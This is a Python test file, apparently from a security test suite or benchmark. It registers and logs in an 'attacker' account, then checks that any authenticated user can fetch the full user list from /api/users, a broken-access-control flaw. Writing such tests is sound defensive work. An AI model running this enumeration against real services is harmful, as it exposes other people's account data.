import requests


def test_exploit_any_authenticated_user_can_list_all_users(app_instance):
    base_url = app_instance["base_url"]
    s = requests.Session()
    s.headers.update({"Accept": "application/json"})

    # register
    r = s.post(
        f"{base_url}/api/auth/register",
        json={"username": "userlist_attacker", "password": "pass123", "display_name": "UserList Attacker"},
        timeout=5,
    )
    assert r.status_code in (200, 201), r.text

    # login
    r = s.post(
        f"{base_url}/api/auth/login",
        json={"username": "userlist_attacker", "password": "pass123"},
        timeout=5,
    )
    assert r.status_code == 200, r.text

    # try list users
    r = s.get(f"{base_url}/api/users", timeout=5)
    assert r.status_code == 200, r.text
    data = r.json()
    assert "users" in data